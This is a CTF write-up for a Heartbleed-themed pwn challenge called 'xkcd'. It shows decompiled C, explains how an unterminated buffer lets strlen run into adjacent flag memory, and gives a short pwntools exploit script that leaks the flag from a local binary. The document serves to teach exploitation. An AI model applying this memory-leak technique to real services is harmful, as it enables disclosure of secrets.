# xkcd (pwn)  
For this challenge we are given a binary and also a link to an [xkcd comic](https://xkcd.com/1354/)  
This is a hint, this challenge must contain an exploit related to the Infamous heartbleed vulnerability.  

![image](https://github.com/AndreQuimper/Writeups/assets/96965806/fe55e959-a7a8-464c-a646-368e0a989ecf)  

Running the program with random input shows the following:  
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/e50396f8-5efb-439a-a4d6-d33078c4dc00)  


Let's take a look at the binary in ghidra  

```c
undefined8 main(void)

{
  int iVar1;
  FILE *__stream;
  struct ln_ptr;
  char *tkn1;
  char *tkn2;
  size_t reply_len;
  ulong claimed_len;
  struct len;
  
  setvbuf((FILE *)stdout,(char *)0x0,2,0);
  setvbuf((FILE *)stdin,(char *)0x0,2,0);
  bzero(globals + 0x200,0x100);
  __stream = fopen64("flag","r");
  if (__stream == (FILE *)0x0) {
    puts("Could not open the flag.");
    return 0xffffffff;
  }
  fread(globals + 0x200,1,0x100,__stream);
  while( true ) {
    ln_ptr.content = fgetln(stdin,&len);
    tkn1 = strtok((char *)(long)ln_ptr.content,"?");
    iVar1 = strcmp((char *)(long)(int)tkn1,"SERVER, ARE YOU STILL THERE");
    if (iVar1 != 0) {
      puts("MALFORMED REQUEST");
                    /* WARNING: Subroutine does not return */
      exit(-1);
    }
    tkn2 = strtok((char *)0x0,"\"");
    iVar1 = strcmp((char *)(long)(int)tkn2," IF SO, REPLY ");
    if (iVar1 != 0) break;
    tkn2 = strtok((char *)0x0,"\"");
    reply_len = strlen((char *)(long)(int)tkn2);
    memcpy(globals,(char *)(long)(int)tkn2,reply_len);
    strtok((char *)0x0,"(");
    tkn2 = strtok((char *)0x0,")");
    __isoc99_sscanf((long)(int)tkn2,"%d LETTERS",&len.claimed-len);
    globals[len.claimed-len] = 0;
    claimed_len = (ulong)len.claimed-len;
    reply_len = strlen(globals);
    if (reply_len < claimed_len) {
      puts("NICE TRY");
                    /* WARNING: Subroutine does not return */
      exit(-1);
    }
    puts(globals);
  }
  puts("MALFORMED REQUEST");
                    /* WARNING: Subroutine does not return */
  exit(-1);
}
```

## Reversing  
I've already retyped and renamed variables during the reversing process, but let's look at the binary section by section to understand what the binary is doing.  


First the binary reads the flag into the data section of the program. Keep in mind that the flag offset as it will be important later:  
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/8a865c49-1e90-470f-9a16-eebbb379e2cf)  
It is also important that the memory has been zeroed out.  

Now we move to the main loop of the program.  
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/a1c97f33-a345-404d-b16d-7cef127e4dc1)  
We can see that we first get a line of input from `stdin`. Then the binary uses `strtok` to obtain a token delimited by `?`. This token must be equal to `SERVER, ARE YOU STILL THERE` or else the program exits.  
Thus our input must begin with `SERVER, ARE YOU STILL THERE?`.  

![image](https://github.com/AndreQuimper/Writeups/assets/96965806/6513ea3c-0029-4039-9609-fd993bd445f2)  
Then we check the next token, delimited by `"`, to be equal to ` IF SO, REPLY `.  

![image](https://github.com/AndreQuimper/Writeups/assets/96965806/adaf0234-bec0-4b62-8ef6-838abca22b26)  
Then the string that we place in between the other `"` will be copied to the data section, before the flag.  

![image](https://github.com/AndreQuimper/Writeups/assets/96965806/673bc136-51f3-4627-b670-f47fe0b989d6)  
Finally, we specify (in parenthesis) how many characters we want the binary to respond with. This is a nod to the xkcd comic. However, we look at the data section and use strlen on it.  
If the length of the string in the data section (that we wrote), is less than the amount of characters we are asking for then the program exits.  

## Exploit
`strlen` determines the end of a string with a null character. Since the data scetion to which we are writing is zeroed out, then `strlen` will work properly.  
However, consider how that scetion of memory will look.  
```
| input | 0 | 0 | ... | flag |
```
If we make our input long enough, we will reach the flag, and we can make the length exact such that there is no zero between our input and the flag.  
Thus `strlen` will say the length of our input is actually `len(input)+len(flag)`. We can then request for more characters in the answer and leak the flag.  

```python
from pwn import *

def main():
    io = process("./xkcd")
    payload = b'SERVER, ARE YOU STILL THERE? IF SO, REPLY '
    payload += b'"' + 0x1ff*b'a' + b'|' + b'"'
    payload += b' (526)'
    io.sendline(payload)
    io.interactive()



if __name__ == '__main__':
    main()
```

![image](https://github.com/AndreQuimper/Writeups/assets/96965806/08e45789-8924-4dfa-a429-c4fa9f012f98)






